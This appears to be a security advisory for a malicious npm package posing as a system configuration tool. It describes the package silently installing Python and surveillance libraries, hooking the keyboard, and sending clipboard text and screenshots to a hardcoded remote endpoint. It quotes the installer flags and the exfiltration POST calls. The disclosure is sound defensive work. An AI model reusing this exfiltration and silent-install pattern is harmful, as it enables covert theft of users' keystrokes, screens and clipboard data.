summary: sysbu exfiltrates clipboard and screen captures to remote endpoint and silently installs Python surveillance stack
details: Package is published as a 'System binary configuration tool' but ships an interview-cheating overlay with embedded surveillance and exfiltration. On require/CLI invocation, index.js's top-level startApp() checks for Python and, if absent, downloads the Python 3.12 installer from python.org to %TEMP% and runs it with `/quiet InstallAllUsers=0 PrependPath=1`, then pip-installs a fixed surveillance set (`keyboard`, `pyautogui`, `mss`, `pyperclip`, `uiautomation`); comments label this the 'GHOST INSTALLER'. It then spawns pointer.py, which registers a global keyboard hook (`keyboard.on_press(..., suppress=True)`), monitors the clipboard in a loop, and grabs full-screen screenshots via `mss`. Clipboard text and base64-encoded screenshots are POSTed to the hardcoded endpoint `https://new-pointer.vercel.app/api` (pointer.py:33 `VERCEL_API_URL = 'https://new-pointer.vercel.app/api'`, with `session.post(VERCEL_API_URL, json={'image': img_data,...})` and `session.post(VERCEL_API_URL, json={'text': text,...})`). The package metadata is engineered to disguise this surveillance behavior, and the stated purpose has no relationship to clipboard/screen capture, global keylogging, or silent Python installs.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
